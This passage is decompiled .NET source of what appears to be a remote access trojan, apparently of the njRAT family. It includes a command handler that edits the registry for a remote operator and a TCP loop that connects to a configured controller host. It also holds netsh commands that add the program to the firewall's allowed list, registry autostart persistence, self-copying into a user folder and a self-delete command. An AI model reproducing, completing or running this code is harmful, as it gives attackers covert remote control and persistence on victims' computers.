							while (enumerator2.MoveNext())
							{
								string text4 = Conversions.ToString(enumerator2.Current);
								string[] array9 = new string[7] { text2, text4, "/", null, null, null, null };
								string[] array10 = array9;
								object[] array2 = new object[1] { text4 };
								object[] array11 = array2;
								bool[] array8 = new bool[1] { true };
								object obj2 = NewLateBinding.LateGet(obj, (Type)null, "GetValueKind", array11, (string[])null, (Type[])null, array8);
								if (array8[0])
								{
									text4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
								}
								array10[3] = obj2.ToString();
								array9[4] = "/";
								string[] array12 = array9;
								object[] array13 = new object[2] { text4, "" };
								object[] array14 = array13;
								bool[] array15 = new bool[2] { true, false };
								object obj3 = NewLateBinding.LateGet(obj, (Type)null, "GetValue", array14, (string[])null, (Type[])null, array15);
								if (array15[0])
								{
									text4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array13[0]), typeof(string));
								}
								array12[5] = obj3.ToString();
								array9[6] = string_8;
								text2 = string.Concat(array9);
							}
						}
						finally
						{
							if (enumerator2 is IDisposable)
							{
								(enumerator2 as IDisposable).Dispose();
							}
						}
						method_26(text + text2);
						break;
					}
					case "!":
					{
						object[] array2 = new object[3];
						object[] array19 = array2;
						string[] array9 = array;
						string[] array20 = array9;
						int num2 = 3;
						array19[0] = array20[3];
						object[] array21 = array2;
						string[] array22 = array;
						int num3 = 4;
						array21[1] = array22[4];
						object[] array23 = array2;
						string[] array4 = array;
						string[] array24 = array4;
						int num = 5;
						array23[2] = array24[5];
						object[] array6 = array2;
						object[] array25 = array6;
						bool[] array8 = new bool[3] { true, true, true };
						NewLateBinding.LateCall(obj, (Type)null, "SetValue", array25, (string[])null, (Type[])null, array8, true);
						if (array8[0])
						{
							array9[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[0]), typeof(string));
						}
						if (array8[1])
						{
							array22[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[1]), typeof(string));
						}
						if (array8[2])
						{
							array4[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[2]), typeof(string));
						}
						break;
					}
					case "@":
					{
						object[] array2 = new object[2];
						object[] array26 = array2;
						string[] array4 = array;
						string[] array27 = array4;
						int num = 3;
						array26[0] = array27[3];
						array2[1] = false;
						object[] array6 = array2;
						object[] array28 = array6;
						bool[] array8 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj, (Type)null, "DeleteValue", array28, (string[])null, (Type[])null, array8, true);
						if (array8[0])
						{
							array4[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[0]), typeof(string));
						}
						break;
					}
					case "#":
					{
						object[] array2 = new object[1];
						object[] array16 = array2;
						string[] array4 = array;
						string[] array17 = array4;
						int num = 3;
						array16[0] = array17[3];
						object[] array6 = array2;
						object[] array18 = array6;
						bool[] array8 = new bool[1] { true };
						NewLateBinding.LateCall(obj, (Type)null, "CreateSubKey", array18, (string[])null, (Type[])null, array8, true);
						if (array8[0])
						{
							array4[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[0]), typeof(string));
						}
						break;
					}
					case "$":
					{
						object[] array2 = new object[1];
						object[] array3 = array2;
						string[] array4 = array;
						string[] array5 = array4;
						int num = 3;
						array3[0] = array5[3];
						object[] array6 = array2;
						object[] array7 = array6;
						bool[] array8 = new bool[1] { true };
						NewLateBinding.LateCall(obj, (Type)null, "DeleteSubKeyTree", array7, (string[])null, (Type[])null, array8, true);
						if (array8[0])
						{
							array4[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[0]), typeof(string));
						}
						break;
					}
					}
					break;
				}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				try
				{
					method_26("ER" + string_8 + array[0] + string_8 + ex2.Message);
					if ((Operators.CompareString(array[0], "up", false) == 0) | (Operators.CompareString(array[0], "rn", false) == 0))
					{
						method_26("bla");
					}
				}
				catch (Exception projectError10)
				{
					ProjectData.SetProjectError(projectError10);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	public RegistryKey method_23(string string_11)
	{
		if (string_11.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_11.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { text, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			return (RegistryKey)obj2;
		}
		if (string_11.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_11.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array4 = new object[2] { text, true };
			object[] array5 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "OpenSubKey", array5, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj4;
		}
		if (string_11.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_11.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj5 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array4 = new object[2] { text, true };
			object[] array6 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj6 = NewLateBinding.LateGet(obj5, (Type)null, "OpenSubKey", array6, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj6;
		}
		if (string_11.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_11.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj7 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array4 = new object[2] { text, true };
			object[] array7 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj8 = NewLateBinding.LateGet(obj7, (Type)null, "OpenSubKey", array7, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj8;
		}
		return null;
	}

	public void method_24(int int_4)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_4, 4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_25(byte[] byte_0)
	{
		if (!bool_17)
		{
			return;
		}
		try
		{
			object obj = new MemoryStream();
			object[] array = new object[3] { byte_0, 0, byte_0.Length };
			object[] array2 = array;
			bool[] array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj, (Type)null, "Write", array2, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
			}
			NewLateBinding.LateCall(obj, (Type)null, "Write", new object[3]
			{
				method_10(ref string_9),
				0,
				string_9.Length
			}, (string[])null, (Type[])null, (bool[])null, true);
			object obj2 = NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
			array = new object[4];
			object[] array4 = array;
			object obj3 = obj;
			array4[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj3, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
			array[1] = 0;
			object[] array5 = array;
			object obj4 = obj;
			array5[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null));
			array[3] = SocketFlags.None;
			object[] array6 = array;
			object[] array7 = array6;
			array3 = new bool[4] { true, false, true, false };
			NewLateBinding.LateCall(obj2, (Type)null, "Send", array7, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				NewLateBinding.LateSetComplex(obj3, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array6[0]) }, (string[])null, (Type[])null, true, false);
			}
			if (array3[2])
			{
				NewLateBinding.LateSetComplex(obj4, (Type)null, "Length", new object[1] { RuntimeHelpers.GetObjectValue(array6[2]) }, (string[])null, (Type[])null, true, false);
			}
			NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool_17 = false;
			ProjectData.ClearProjectError();
		}
	}

	public void method_26(string string_11)
	{
		method_25(method_10(ref string_11));
	}

	public void method_27()
	{
		object obj = new MemoryStream();
		int num = 0;
		checked
		{
			while (true)
			{
				try
				{
					if (object_2 != null && !Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Connected", new object[0], (string[])null, (Type[])null, (bool[])null), (object)false, false) && bool_17)
					{
						num++;
						if (num <= 500)
						{
							goto IL_0101;
						}
						num = 0;
						if (!Conversions.ToBoolean(Operators.AndObject(NewLateBinding.LateGet(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Poll", new object[2]
						{
							-1,
							SelectMode.SelectRead
						}, (string[])null, (Type[])null, (bool[])null), Operators.CompareObjectLessEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))))
						{
							goto IL_0101;
						}
					}
					goto end_IL_0008;
					IL_0101:
					if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(object_2, (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))
					{
						byte[] array = new byte[Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(object_2, (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)) + 1];
						object obj2 = NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array2 = new object[4]
						{
							array,
							0,
							array.Length,
							SocketFlags.None
						};
						object[] array3 = array2;
						bool[] array4 = new bool[4] { true, false, false, false };
						NewLateBinding.LateCall(obj2, (Type)null, "Receive", array3, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
						}
						object obj3 = obj;
						object[] array5 = new object[3] { array, 0, array.Length };
						object[] array6 = array5;
						array4 = new bool[3] { true, false, false };
						NewLateBinding.LateCall(obj3, (Type)null, "Write", array6, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
						}
						while (true)
						{
							object obj4 = obj;
							byte[] byte_ = (byte[])NewLateBinding.LateGet(obj4, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
							string text = method_11(ref byte_);
							NewLateBinding.LateSetComplex(obj4, (Type)null, "ToArray", new object[1] { byte_ }, (string[])null, (Type[])null, true, false);
							if (text.Contains(string_9))
							{
								Array array7 = method_12((byte[])NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null), string_9);
								Thread thread = new Thread(delegate(object object_4)
								{
									method_22((byte[])object_4);
								});
								thread.Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array7, new object[1] { 0 }, (string[])null)));
								NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
								obj = new MemoryStream();
								if (array7.Length == 2)
								{
									object obj5 = obj;
									object[] array8 = new object[3];
									array5 = new object[1];
									object[] array9 = array5;
									int num2 = 1;
									array9[0] = 1;
									array8[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array7, array5, (string[])null));
									array8[1] = 0;
									object[] array10 = new object[1];
									array2 = array10;
									object[] array11 = array2;
									int num3 = 0;
									obj4 = 1;
									array11[0] = RuntimeHelpers.GetObjectValue(obj4);
									object[] array12 = array2;
									string[] array13 = null;
									array8[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array7, array12, array13), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null));
									object[] array14 = array8;
									array4 = new bool[3] { true, false, true };
									NewLateBinding.LateCall(obj5, (Type)null, "Write", array14, (string[])null, (Type[])null, array4, true);
									if (array4[0])
									{
										NewLateBinding.LateIndexSetComplex((object)array7, new object[2]
										{
											num2,
											RuntimeHelpers.GetObjectValue(array14[0])
										}, (string[])null, true, false);
									}
									if (array4[2])
									{
										array2 = array10;
										array2[num3] = RuntimeHelpers.GetObjectValue(obj4);
										NewLateBinding.LateSetComplex(NewLateBinding.LateIndexGet((object)array7, array12, array13), (Type)null, "length", new object[1] { RuntimeHelpers.GetObjectValue(array14[2]) }, (string[])null, (Type[])null, true, true);
									}
									continue;
								}
								break;
							}
							break;
						}
					}
					goto IL_079c;
					end_IL_0008:;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				while (true)
				{
					bool_17 = false;
					try
					{
						NewLateBinding.LateCall(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Disconnect", new object[1] { false }, (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					try
					{
						NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					obj = new MemoryStream();
					try
					{
						NewLateBinding.LateCall(object_1, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						object_1 = null;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					try
					{
						object_2 = new TcpClient();
						NewLateBinding.LateSet(object_2, (Type)null, "ReceiveTimeout", new object[1] { -1 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(object_2, (Type)null, "SendTimeout", new object[1] { -1 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(object_2, (Type)null, "SendBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(object_2, (Type)null, "ReceiveBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null);
						NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SendBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null, false, true);
						NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ReceiveBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null, false, true);
						num = 0;
						object obj6 = NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array15 = new object[2] { string_6, string_7 };
						object[] array16 = array15;
						bool[] array4 = new bool[2] { true, true };
						NewLateBinding.LateCall(obj6, (Type)null, "Connect", array16, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							string_6 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
						}
						if (array4[1])
						{
							string_7 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[1]), typeof(string));
						}
						bool_17 = true;
						method_26(method_5());
						try
						{
							if (Operators.CompareString(method_3("us"), "!", false) == 0)
							{
								method_26("us");
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							bool_17 = false;
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						Thread.Sleep(2500);
						ProjectData.ClearProjectError();
						continue;
					}
					break;
				}
				continue;
				IL_079c:
				Thread.Sleep(1);
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_28()
	{
		method_24(0);
		gclass2_0.method_1();
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { string_10, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			object[] array4 = new object[2] { string_5, false };
			object[] array5 = array4;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj2, (Type)null, "DeleteValue", array5, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array7 = new object[2] { string_10, true };
			object[] array8 = array7;
			bool[] array6 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "OpenSubKey", array8, (string[])null, (Type[])null, array6);
			if (array6[0])
			{
				string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
			}
			object[] array9 = new object[2] { string_5, false };
			object[] array10 = array9;
			bool[] array3 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj4, (Type)null, "DeleteValue", array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"netsh firewall delete allowedprogram \"", NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"')), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj5 = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "OpenSubKey", new object[2] { "Software", true }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { string_5, false };
			object[] array11 = array;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj5, (Type)null, "DeleteSubKey", array11, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"cmd.exe /k ping 0 & del \"", NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" & exit")), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	private bool method_29(FileInfo fileInfo_0, FileInfo fileInfo_1)
	{
		if (Operators.CompareString(fileInfo_0.get_Name().ToLower(), fileInfo_1.get_Name().ToLower(), false) != 0)
		{
			return false;
		}
		DirectoryInfo directoryInfo = fileInfo_0.Directory;
		DirectoryInfo directoryInfo2 = fileInfo_1.Directory;
		do
		{
			if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
			{
				directoryInfo = directoryInfo.Parent;
				directoryInfo2 = directoryInfo2.Parent;
				if (!(directoryInfo == null && directoryInfo2 == null))
				{
					if (directoryInfo == null)
					{
						return false;
					}
					continue;
				}
				return true;
			}
			return false;
		}
		while (directoryInfo2 != null);
		return false;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_30()
	{
		if (!method_29((FileInfo)object_0, new FileInfo(Interaction.Environ(string_4).ToLower() + "\\" + string_3.ToLower())))
		{
			try
			{
				if (Operators.CompareString(method_3("us"), "", false) == 0)
				{
					if (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_0, (Type)null, "Directory", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Contains", new object[1] { ":" }, (string[])null, (Type[])null, (bool[])null)))
					{
						method_4("US", "!");
					}
					else
					{
						method_4("US", "@");
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				string string_ = "";
				Environment.SetEnvironmentVariable(method_8(ref string_), "1", EnvironmentVariableTarget.User);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			if (bool_16)
			{
				try
				{
					try
					{
						if (File.Exists(Interaction.Environ(string_4) + "\\" + string_3))
						{
							File.Delete(Interaction.Environ(string_4) + "\\" + string_3);
						}
						File.Copy(Conversions.ToString(NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Interaction.Environ(string_4) + "\\" + string_3, overwrite: true);
						Process.Start(Interaction.Environ(string_4) + "\\" + string_3);
						ProjectData.EndApp();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.EndApp();
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"netsh firewall add allowedprogram \"", NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" "), (object)'"'), NewLateBinding.LateGet(object_0, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ENABLE")), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { string_10, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			object[] array4 = new object[2]
			{
				string_5,
				Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ..")
			};
			object[] array5 = array4;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj2, (Type)null, "SetValue", array5, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array7 = new object[2] { string_10, true };
			object[] array8 = array7;
			bool[] array6 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "OpenSubKey", array8, (string[])null, (Type[])null, array6);
			if (array6[0])
			{
				string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
			}
			object[] array9 = new object[2]
			{
				string_5,
				Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ..")
			};
			object[] array10 = array9;
			bool[] array3 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj4, (Type)null, "SetValue", array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		Thread.Sleep(1000);
	}

